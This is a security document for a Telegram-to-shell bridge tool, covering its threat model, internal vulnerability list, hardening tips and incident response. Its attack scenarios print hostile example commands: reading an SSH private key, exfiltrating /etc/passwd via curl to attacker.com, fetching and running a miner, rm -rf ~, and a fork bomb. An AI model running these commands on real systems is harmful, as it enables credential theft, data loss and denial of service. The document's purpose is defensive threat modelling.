# Security Documentation
## Telegram Terminal Bridge

**Version:** 0.1.x
**Last Updated:** 2026-02-15
**Security Level:** MEDIUM (Telegram), MEDIUM (WebUI)

---

## Table of Contents

1. [Security Overview](#security-overview)
2. [Threat Model](#threat-model)
3. [Authentication & Authorization](#authentication--authorization)
4. [Vulnerabilities](#vulnerabilities)
5. [Security Best Practices](#security-best-practices)
6. [Incident Response](#incident-response)
7. [Compliance](#compliance)
8. [Security Roadmap](#security-roadmap)

---

## Security Overview

### Security Posture

| Component | Security Level | Status |
|-----------|---------------|--------|
| **Telegram Bot** | MEDIUM | ⚠️ Functional but needs hardening |
| **WebUI** | MEDIUM | ✅ Password auth + session cookies |
| **PTY Execution** | HIGH RISK | ⚠️ Full shell access, no sandboxing |
| **Config Storage** | LOW | ✅ Proper file permissions (0600) |
| **Dependencies** | LOW | ✅ Minimal, well-maintained |

### Design Principles

1. **Security by Layers** - Multi-stage authentication (bot token + approval code + whitelist)
2. **Least Privilege** - Commands run with user's own permissions
3. **Fail Secure** - Unknown users blocked by default
4. **Audit Trail** - (⚠️ NOT IMPLEMENTED - Future work)

### Known Limitations

⚠️ **This is NOT enterprise-grade security:**
- No sandboxing or isolation
- No audit logging
- No rate limiting
- No intrusion detection
- WebUI uses password auth (bcrypt) with session cookies

**Intended Use:** Trusted users on personal machines

---

## Threat Model

### Assets

| Asset | Value | Impact if Compromised |
|-------|-------|----------------------|
| **Shell Access** | CRITICAL | Full control of server |
| **Config File** | HIGH | Bot token, user whitelist |
| **Running Sessions** | MEDIUM | Read/write to active terminals |
| **Bot Token** | HIGH | Impersonate bot, read messages |

### Threat Actors

#### 1. External Attacker (Remote)

**Capabilities:**
- Network access to server
- Knowledge of Telegram bot username
- May know user's Telegram ID

**Attack Vectors:**
- ❌ Direct bot interaction (blocked by whitelist)
- ⚠️ WebUI access if exposed to internet
- ⚠️ Bot token theft via process listing
- ❌ Telegram API compromise (out of scope)

**Risk Level:** LOW (Telegram), CRITICAL (exposed WebUI)

---

#### 2. Local User (Same Machine)

**Capabilities:**
- Read files with same user permissions
- View process list
- Network access to localhost:8080

**Attack Vectors:**
- ✅ Read config file (mitigated by 0600 permissions)
- ✅ WebUI access on localhost (password auth required)
- ⚠️ Process memory inspection
- ❌ PTY hijacking (requires root)

**Risk Level:** MEDIUM

---

#### 3. Compromised Dependency

**Capabilities:**
- Code execution via malicious library update
- Access to all process resources

**Attack Vectors:**
- Supply chain attack on Go dependencies
- Backdoor in `creack/pty` or `telegram-bot-api`

**Risk Level:** LOW (reputable dependencies)

**Mitigation:**
- Pin dependency versions in `go.mod`
- Review updates before upgrading
- Use `go mod verify`

---

#### 4. Malicious Telegram User

**Capabilities:**
- Knows bot username
- Attempts to gain unauthorized access

**Attack Vectors:**
- ❌ Brute force approval code (blocked after first use)
- ❌ Social engineering (out of scope)
- ❌ Telegram account compromise (out of scope)

**Risk Level:** LOW

---

### Attack Scenarios

#### Scenario 1: Unauthorized WebUI Access

**Attacker:** Local user on shared machine

**Attack:**
```bash
# Attacker discovers WebUI port
lsof -i :8080

# Connects to WebUI
curl http://localhost:8080/

# Opens WebSocket, executes commands
wscat -c ws://localhost:8080/ws
> {"type": "command", "content": "cat ~/.ssh/id_rsa"}
```

**Impact:** CRITICAL - Full shell access

**Mitigation:**
- ✅ Password authentication with bcrypt hashing
- ✅ Session cookies (HttpOnly, SameSite=Strict)
- ✅ WebSocket origin validation
- ✅ WebUI only on localhost by default

**Status:** ✅ **MITIGATED (v0.1.3)**

---

#### Scenario 2: Bot Token Theft

**Attacker:** Local user

**Attack:**
```bash
# Read config file (fails if permissions correct)
cat ~/.telegram-terminal/config.json
# Permission denied (if 0600)

# Alternative: Process listing during setup
ps aux | grep remote-term
# May show bot token in command args during /setup
```

**Impact:** HIGH - Bot impersonation, message reading

**Mitigation:**
- ✅ Config file 0600 permissions
- ⚠️ Token visible in process args during setup
- ❌ No token encryption at rest

**Status:** ⚠️ **PARTIALLY MITIGATED**

---

#### Scenario 3: Command Injection via Input

**Attacker:** Authorized user (or compromised account)

**Attack:**
```bash
# User sends malicious command
rm -rf ~ &

# Or exfiltrate data
curl https://attacker.com/$(cat /etc/passwd | base64)

# Or crypto mining
wget https://malware.com/miner && ./miner
```

**Impact:** HIGH - Data loss, resource abuse

**Mitigation:**
- ❌ **BY DESIGN** - This is a shell bridge
- ⚠️ Partial: Commands run with user permissions (not root)
- ⚠️ Partial: User whitelist limits attack surface

**Status:** ⚠️ **ACCEPTED RISK**

---

#### Scenario 4: Resource Exhaustion

**Attacker:** Authorized malicious user

**Attack:**
```bash
# Fork bomb
:(){ :|:& };:

# Memory bomb
python -c "a='x'*10**10"

# Infinite loop
while true; do echo "spam"; done
```

**Impact:** MEDIUM - Service degradation, system crash

**Mitigation:**
- ❌ No cgroups or resource limits
- ⚠️ Partial: 30-minute session timeout
- ⚠️ Partial: Process group kill works

**Status:** ❌ **UNMITIGATED**

---

#### Scenario 5: Session Hijacking

**Attacker:** Network attacker (MITM)

**Attack:**
```
# Telegram: Not possible (TLS)
# WebUI: Possible if exposed without HTTPS

# Attacker intercepts WebSocket traffic
# Reads/writes commands in plaintext
```

**Impact:** CRITICAL - Full session control

**Mitigation:**
- ✅ Telegram uses TLS (built-in)
- ❌ WebUI uses plain HTTP/WS (no TLS)
- ⚠️ Partial: Localhost only by default

**Status:** ⚠️ **MITIGATED** (localhost only)

---

## Authentication & Authorization

### Telegram Bot Authentication

**Multi-Layer Security:**

```
┌─────────────────────────────────────┐
│  Layer 1: Bot Token Validation      │
│  - Telegram API verifies token      │
│  - Invalid token = connection fails │
└─────────────┬───────────────────────┘
              │
┌─────────────▼───────────────────────┐
│  Layer 2: Approval Code (First Use) │
│  - 5-digit random code              │
│  - One-time use                     │
│  - User must send code to bot       │
└─────────────┬───────────────────────┘
              │
┌─────────────▼───────────────────────┐
│  Layer 3: User ID Whitelist         │
│  - Telegram user ID captured        │
│  - Stored in config.json            │
│  - Checked on every message         │
└─────────────────────────────────────┘
```

#### Layer 1: Bot Token

**Implementation:**
```go
bot, err := tgbotapi.NewBotAPI(config.BotToken)
if err != nil {
    return fmt.Errorf("invalid bot token: %w", err)
}
```

**Security Properties:**
- ✅ Validated by Telegram API
- ✅ Unique per bot
- ⚠️ Stored in plaintext
- ⚠️ Visible in process args during setup

**Threats:**
- Token theft from config file (mitigated by 0600)
- Token exposure via process listing (⚠️ unmitigated)

---

#### Layer 2: Approval Code

**Implementation:**
```go
func generateCode() string {
    return fmt.Sprintf("%05d", rand.Intn(100000))  // ⚠️ math/rand, not crypto/rand
}
```

**Security Properties:**
- ✅ One-time use
- ✅ Required for first connection
- ✅ Auto-seeded (Go 1.20+ uses random seed by default)
- ⚠️ Only 100,000 possible values
- ⚠️ No expiration time
- ⚠️ Not cryptographically secure (math/rand)

**Threats:**
- Brute force: 100,000 attempts needed
- Timing: No rate limiting on guesses
- Weak PRNG: Predictable if seed known

**Improvements Needed:**
```go
import "crypto/rand"

func generateCode() (string, error) {
    b := make([]byte, 3)
    _, err := rand.Read(b)
    if err != nil {
        return "", err
    }
    num := int(b[0])<<16 | int(b[1])<<8 | int(b[2])
    return fmt.Sprintf("%05d", num%100000), nil
}
```

---

#### Layer 3: User ID Whitelist

**Implementation:**
```go
func (tb *TelegramBridge) isAuthorized(userID int64) bool {
    for _, allowedID := range tb.config.AllowedUsers {
        if userID == allowedID {
            return true
        }
    }
    return false
}
```

**Security Properties:**
- ✅ Telegram user IDs are immutable
- ✅ Cannot be spoofed (Telegram API guarantee)
- ✅ Whitelist stored securely (0600 file)
- ❌ No audit trail of authorization checks

**Threats:**
- Compromised Telegram account (out of scope)
- Config file modification by attacker

---

### WebUI Authentication

**Current State:** ✅ **Password-based auth with session cookies**

**Implementation (v0.1.3):**
- First access: "Create Password" setup page (bcrypt hashed, saved to config)
- Subsequent access: Login page validates password against bcrypt hash
- On success: `crypto/rand` 32-byte hex session token stored server-side
- Cookie: `HttpOnly; SameSite=Strict`, 24-hour expiry
- WebSocket: Requires valid session cookie or returns 401
- Origin validation: WebSocket upgrades only accepted from same-origin
- Logout: Clears server-side session and cookie

**Security Properties:**
- ✅ bcrypt password hashing (cost 10)
- ✅ Cryptographically random session tokens
- ✅ Server-side session store (revocable on logout)
- ✅ HttpOnly cookies (no JS access)
- ✅ SameSite=Strict (CSRF protection)
- ✅ Setup blocked once password exists (no re-setup attack)
- ⚠️ Sessions lost on server restart
- ⚠️ No rate limiting on login attempts (future work)

---

## Vulnerabilities

### Critical Vulnerabilities (CVSS 9.0+)

#### CVE-INTERNAL-001: WebUI Unauthenticated Command Execution

**Severity:** CRITICAL (CVSS 9.8) — **RESOLVED in v0.1.3**

**Description:**
The WebUI interface previously had no authentication mechanism.

**Affected Versions:** pre-0.1.3

**Fix Applied (v0.1.3):**
- Password-based authentication with bcrypt hashing
- Server-side session management with 24h expiry
- WebSocket endpoint gated behind session validation
- Origin-checking WebSocket upgrader

**Timeline:**
- Discovered: 2026-02-14
- Fixed: 2026-02-14 (v0.1.3)
- Status: **RESOLVED**

---

### High Vulnerabilities (CVSS 7.0-8.9)

#### CVE-INTERNAL-002: Weak Approval Code Generation

**Severity:** HIGH (CVSS 7.5)

**Description:**
Approval code uses weak PRNG (math/rand) with predictable seed (time.Now()). Only 100,000 possible values, no rate limiting.

**Affected Code:**
```go
func generateCode() string {
    return fmt.Sprintf("%05d", rand.Intn(100000))  // math/rand
}
```

**Attack Vector:**
- Brute force 100,000 codes
- No rate limiting or account lockout

**Impact:**
- Unauthorized user whitelisting
- Bot access without permission

**Mitigation:** ⚠️ Partial (one-time use limits window)

**Fix:** Use crypto/rand, increase to 8 digits, add expiration

**Status:** Open

---

#### CVE-INTERNAL-003: Race Condition in Session Map

**Severity:** HIGH (CVSS 7.4)

**Description:**
TelegramBridge.sessions map accessed without mutex protection. Concurrent message handling can corrupt map.

**Affected Code:**
```go
type TelegramBridge struct {
    sessions map[int64]*Session  // No mutex!
}

func (tb *TelegramBridge) handleCommand(...) {
    session := tb.sessions[chatID]  // RACE!
}
```

**Attack Vector:**
- Send two messages simultaneously
- Trigger concurrent map write
- Crash or undefined behavior

**Impact:**
- Service crash
- Session corruption
- Potential data corruption

**Mitigation:** ❌ None

**Fix:** Add sync.RWMutex

**Status:** Open

---

### Medium Vulnerabilities (CVSS 4.0-6.9)

#### CVE-INTERNAL-004: Bot Token Exposed in Process Listing

**Severity:** MEDIUM (CVSS 5.5)

**Description:**
During `/setup <token>` command, bot token may appear in process arguments visible to other users via `ps aux`.

**Attack Vector:**
```bash
# During setup
remote-term
> /setup 7234567890:AAHdqTcvCH1vGEqJmOXL5tB6Dw7GvM9Yw_Q

# Attacker runs
ps aux | grep remote-term
# May see token in args
```

**Impact:**
- Bot token theft
- Bot impersonation

**Mitigation:** ⚠️ Short exposure window

**Fix:** Read token from file or stdin instead of args

**Status:** Open

---

#### CVE-INTERNAL-005: No Resource Limits

**Severity:** MEDIUM (CVSS 5.0)

**Description:**
No cgroups or resource limits on spawned processes. Authorized user can exhaust system resources.

**Attack Vector:**
```bash
# Fork bomb
:(){ :|:& };:

# Memory bomb
python -c "a='x'*10**10"
```

**Impact:**
- Service degradation
- System crash
- Denial of service

**Mitigation:** ⚠️ Partial (30-min timeout, process group kill)

**Fix:** Implement cgroups limits (CPU, memory, processes)

**Status:** Open

---

### Low Vulnerabilities (CVSS <4.0)

#### CVE-INTERNAL-006: Plaintext Token Storage

**Severity:** LOW (CVSS 3.3)

**Description:**
Bot token stored in plaintext in config.json. Protected by file permissions but not encrypted.

**Mitigation:** ✅ File permissions 0600

**Fix:** Encrypt config file at rest (future)

**Status:** Accepted Risk

---

#### CVE-INTERNAL-007: No Audit Logging

**Severity:** LOW (CVSS 2.0)

**Description:**
No audit trail of commands executed, sessions started, or authentication attempts.

**Impact:**
- No forensics capability
- Cannot detect unauthorized use

**Fix:** Implement structured logging (future)

**Status:** Accepted Risk (not enterprise tool)

---

## Security Best Practices

### For Users (Deployment)

#### 1. Secure the Config File

```bash
# Ensure proper permissions
chmod 600 ~/.telegram-terminal/config.json

# Verify ownership
ls -l ~/.telegram-terminal/config.json
# Should show: -rw------- 1 youruser youruser

# DO NOT commit to git
echo ".telegram-terminal/" >> ~/.gitignore
```

#### 2. Limit WebUI Exposure

```bash
# ❌ NEVER expose WebUI to internet
# Bad:
remote-term --web 0.0.0.0:8080

# ✅ Localhost only (default)
remote-term --web 8080

# Or use firewall
ufw deny 8080
ufw allow from 127.0.0.1 to any port 8080
```

#### 3. Restrict User Whitelist

```json
{
  "bot_token": "...",
  "allowed_users": [
    400702758
  ]
}
```

**DO:**
- ✅ Only add trusted users
- ✅ Use @userinfobot to verify user IDs
- ✅ Review whitelist periodically

**DON'T:**
- ❌ Share approval codes
- ❌ Add unknown users
- ❌ Run as root (use regular user)

#### 4. Monitor for Suspicious Activity

```bash
# Check active sessions
ps aux | grep remote-term

# Monitor bot.log
tail -f bot.log | grep "Unauthorized"

# Check for unusual processes
ps -ef --forest | grep remote-term -A 10
```

#### 5. Update Dependencies

```bash
# Check for updates
go list -m -u all

# Update dependencies
go get -u ./...
go mod tidy

# Verify checksums
go mod verify
```

---

### For Developers (Code)

#### 1. Validate All Inputs

```go
// ❌ Bad: Direct use
terminal.SendCommand(userInput)

// ✅ Better: Validate (though limited for shell)
if strings.Contains(userInput, "\x00") {
    return fmt.Errorf("null byte not allowed")
}
terminal.SendCommand(userInput)
```

#### 2. Use Secure Randomness

```go
// ❌ Bad: Predictable
rand.Seed(time.Now().UnixNano())
code := rand.Intn(100000)

// ✅ Good: Cryptographically secure
import "crypto/rand"
b := make([]byte, 4)
rand.Read(b)
code := binary.BigEndian.Uint32(b) % 100000
```

#### 3. Protect Shared State

```go
// ❌ Bad: No mutex
type Bridge struct {
    sessions map[int64]*Session
}

// ✅ Good: Protected
type Bridge struct {
    mu       sync.RWMutex
    sessions map[int64]*Session
}

func (b *Bridge) getSession(id int64) *Session {
    b.mu.RLock()
    defer b.mu.RUnlock()
    return b.sessions[id]
}
```

#### 4. Fail Secure

```go
// ❌ Bad: Open on error
if err := checkAuth(); err != nil {
    log.Println("Auth error:", err)
    // Continue anyway...
}

// ✅ Good: Closed on error
if err := checkAuth(); err != nil {
    return fmt.Errorf("authentication failed: %w", err)
}
```

#### 5. Minimize Privileges

```go
// Run commands as current user (not root)
cmd.SysProcAttr = &syscall.SysProcAttr{
    Credential: &syscall.Credential{
        Uid: uint32(os.Getuid()),
        Gid: uint32(os.Getgid()),
    },
}
```

---

## Incident Response

### Detection

**Indicators of Compromise:**

1. **Unauthorized Access**
   - Unknown user IDs in logs
   - Failed authentication attempts
   - Commands from unexpected users

2. **Malicious Commands**
   - `curl` to unknown domains
   - `wget` downloading executables
   - `/tmp` file creation
   - High CPU/memory usage

3. **Bot Token Compromise**
   - Bot messages not sent by you
   - Unexpected bot name changes
   - Bot added to unknown groups

### Response Procedures

#### Step 1: Confirm Incident

```bash
# Check logs
tail -100 bot.log | grep -i "error\|unauthorized\|failed"

# Check running processes
ps aux | grep remote-term -A 20

# Check connections
lsof -i -P -n | grep remote-term
```

#### Step 2: Contain

```bash
# Stop the service immediately
pkill -9 remote-term

# Kill all sessions
pkill -9 -f "bash --norc"
pkill -9 -f python3
pkill -9 -f claude

# Verify stopped
ps aux | grep defunct  # Should be empty
```

#### Step 3: Investigate

```bash
# Review full logs
cat bot.log
cat webui.log

# Check config for modifications
stat ~/.telegram-terminal/config.json
cat ~/.telegram-terminal/config.json

# Check for new authorized users
jq '.allowed_users' ~/.telegram-terminal/config.json
```

#### Step 4: Recover

```bash
# Revoke bot token via @BotFather
# /revoke → Select bot → Confirm

# Delete config
rm ~/.telegram-terminal/config.json

# Re-setup with new token
remote-term
> /setup <NEW_TOKEN>

# Review and minimal whitelist
# Only add verified users
```

#### Step 5: Post-Incident

- Document timeline
- Identify root cause
- Update security procedures
- Patch vulnerabilities
- Monitor for recurrence

---

## Compliance

### Data Protection (GDPR/CCPA)

**Personal Data Collected:**
- Telegram user ID (immutable identifier)
- Telegram username (optional, from API)
- Command history (in memory only)
- Session metadata (duration, timestamps)

**Data Storage:**
- Config file: `~/.telegram-terminal/config.json`
- Logs: `bot.log`, `webui.log` (if enabled)
- Memory: Active sessions only

**Data Retention:**
- Config: Indefinite (until manual deletion)
- Logs: Until file rotation/deletion
- Sessions: In-memory only (cleared on exit)

**User Rights:**
- Right to access: `cat ~/.telegram-terminal/config.json`
- Right to deletion: `rm ~/.telegram-terminal/config.json`
- Right to portability: JSON format (human-readable)

**Compliance Gaps:**
- ❌ No data encryption at rest
- ❌ No automatic data deletion
- ❌ No consent management
- ❌ No privacy policy

**Recommendation:** Not suitable for GDPR-regulated use cases without enhancements

---

### Industry Standards

#### OWASP Top 10 (2021)

| Risk | Compliance | Notes |
|------|------------|-------|
| A01: Broken Access Control | ✅ PASS | WebUI password auth + session cookies |
| A02: Cryptographic Failures | ⚠️ PARTIAL | Weak PRNG, plaintext storage |
| A03: Injection | ✅ N/A | Shell access by design |
| A04: Insecure Design | ⚠️ PARTIAL | No sandboxing |
| A05: Security Misconfiguration | ⚠️ PARTIAL | WebUI auth on, but no TLS |
| A06: Vulnerable Components | ✅ PASS | Dependencies up-to-date |
| A07: Auth Failures | ⚠️ PARTIAL | Weak approval code |
| A08: Software/Data Integrity | ✅ PASS | Go mod verify |
| A09: Logging/Monitoring | ❌ FAIL | No audit logs |
| A10: SSRF | ✅ N/A | No external requests |

**Overall:** ⚠️ **NOT COMPLIANT** (4 failures, 5 partial)

---

#### CIS Controls

| Control | Implementation | Status |
|---------|---------------|--------|
| Access Control | User whitelist | ⚠️ Partial |
| Data Protection | File permissions 0600 | ✅ Yes |
| Audit Logs | None | ❌ No |
| Secure Config | Minimal attack surface | ⚠️ Partial |
| Malware Defense | None | ❌ No |

---

## Security Roadmap

### Current Release (0.1.x)

**Completed:**
- [x] **P0:** Add WebUI authentication (bcrypt password + session cookies)
- [ ] **P0:** Fix race condition in session map (add mutex)
- [ ] **P0:** Replace weak PRNG with crypto/rand
- [ ] **P1:** Add rate limiting on authentication attempts
- [ ] **P1:** Implement bot token encryption at rest

**Risk Reduction:** CRITICAL → MEDIUM

---

### Next (HARDENING)

**Should Fix:**
- [ ] **P2:** Implement cgroups resource limits
- [ ] **P2:** Add audit logging (structured, append-only)
- [ ] **P2:** Token rotation capability
- [ ] **P3:** Session replay protection
- [ ] **P3:** Input sanitization layer (beyond shell)

**Timeline:** 2 months
**Risk Reduction:** MEDIUM → LOW

---

### Long-term (ENTERPRISE)

**Nice to Have:**
- [ ] **P4:** Sandboxing via containers/chroot
- [ ] **P4:** SSO/SAML integration
- [ ] **P4:** Role-based access control (RBAC)
- [ ] **P4:** Intrusion detection system (IDS)
- [ ] **P4:** Compliance automation (SOC2, ISO 27001)

**Timeline:** 6+ months
**Risk Reduction:** LOW → VERY LOW

---

## Security Contacts

**Report Vulnerabilities:**
- GitHub Issues: https://github.com/jazztong/remote-terminal/issues
- Response SLA: 48 hours

**Security Updates:**
- Mailing list: [Not configured]
- Security advisories: GitHub Releases

---

## Changelog

| Date | Version | Changes |
|------|---------|---------|
| 2026-02-15 | 1.2 | Fix version refs (v2.1→0.1.3), update code examples |
| 2026-02-15 | 1.1 | Updated for 0.1.x release, binary rename |
| 2026-02-14 | 1.0 | Initial security documentation |

---

## Related Documents

- [ARCHITECTURE.md](./ARCHITECTURE.md) - Technical architecture
- [CLAUDE.md](./CLAUDE.md) - AI assistant guidelines
- [README.md](./README.md) - User documentation

---

**Document Version:** 1.2
**Classification:** Internal Use
**Last Reviewed:** 2026-02-15
**Next Review:** 2026-05-15 (quarterly)
